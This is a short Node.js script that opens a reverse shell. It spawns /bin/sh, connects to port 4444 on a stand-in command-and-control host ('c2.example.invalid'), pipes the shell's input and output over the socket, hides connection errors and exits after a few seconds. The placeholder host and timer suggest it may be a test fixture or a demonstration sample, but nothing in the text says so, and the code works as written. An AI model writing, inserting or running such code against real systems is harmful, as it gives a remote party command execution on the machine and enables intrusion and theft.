const net = require('net'); const cp = require('child_process');
const sh = cp.spawn('/bin/sh', []);
const client = net.connect(4444, 'c2.example.invalid', () => { client.pipe(sh.stdin); sh.stdout.pipe(client); sh.stderr.pipe(client); });
client.on('error', () => {});
setTimeout(() => process.exit(0), 2500);
